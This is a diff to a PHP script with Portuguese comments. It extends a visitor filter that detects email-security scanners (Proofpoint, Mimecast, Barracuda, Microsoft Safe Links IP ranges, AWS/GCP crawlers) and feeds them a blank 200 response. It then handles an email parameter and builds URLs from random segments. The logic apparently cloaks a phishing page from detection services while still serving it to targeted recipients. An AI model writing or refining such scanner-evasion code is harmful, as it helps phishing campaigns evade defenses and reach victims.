@@ -7,7 +7,6 @@ $bot_agents = [
     'Microsoft Office', 'msnbot', 'Outlook-iOS',
     'Google-Safety', 'Barracuda', 'Proofpoint',
     'Mimecast', 'Sophos', 'Symantec',
-    'Mozilla/4.0 (compatible;)', // UA genérico de scanners
     'curl', 'python-requests', 'Go-http-client',
     'Wget', 'libwww-perl'
 ];
@@ -19,15 +18,42 @@ foreach ($bot_agents as $bot) {
     }
 }
 
-// Bots por IP range (AWS, Azure, Google que fazem scanning)
-$bot_ip_ranges = [
-    '54.', '52.', '34.', '35.',   // AWS/GCP comuns
-    '40.82.', '40.94.',            // Microsoft
-    '185.220.',                     // Scanners conhecidos
+// Ranges Microsoft Corporation
+$microsoft_ranges = [
+    ['20.64.0.0',    '20.127.255.255'],
+    ['4.144.0.0',    '4.159.255.255'],
+    ['20.192.0.0',   '20.255.255.255'],
+    ['20.226.12.0',  '20.226.12.255'],
+    ['40.80.0.0',    '40.95.255.255'],
+    ['13.64.0.0',    '13.95.255.255'],
+    ['52.160.0.0',   '52.191.255.255'],
+    ['13.104.0.0',   '13.107.255.255'],
+    ['20.0.0.0',     '20.31.255.255'],
+    ['172.160.0.0',  '172.191.255.255'],
+    ['52.96.0.0',    '52.111.255.255'],
+    ['52.112.0.0',   '52.115.255.255'],
+    ['104.40.0.0',   '104.47.255.255'],
+    ['4.192.0.0',    '4.207.255.255'],  // Microsoft Brazil
 ];
 
-foreach ($bot_ip_ranges as $range) {
-    if (strpos($ip, $range) === 0) {
+$ip_long = ip2long($ip);
+if ($ip_long !== false) {
+    foreach ($microsoft_ranges as $range) {
+        if ($ip_long >= ip2long($range[0]) && $ip_long <= ip2long($range[1])) {
+            http_response_code(200);
+            exit;
+        }
+    }
+}
+
+// Ranges AWS/GCP genéricos por prefixo
+$bot_ip_prefixes = [
+    '54.', '52.1', '34.', '35.',
+    '185.220.',
+];
+
+foreach ($bot_ip_prefixes as $prefix) {
+    if (strpos($ip, $prefix) === 0) {
         http_response_code(200);
         exit;
     }
@@ -47,7 +73,6 @@ if (empty($email)) {
 
 $baseUrl = 'https://www.okieweb.com/';
 
-// Gerador mais seguro
 function generateSegment($length) {
     $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     $result = '';
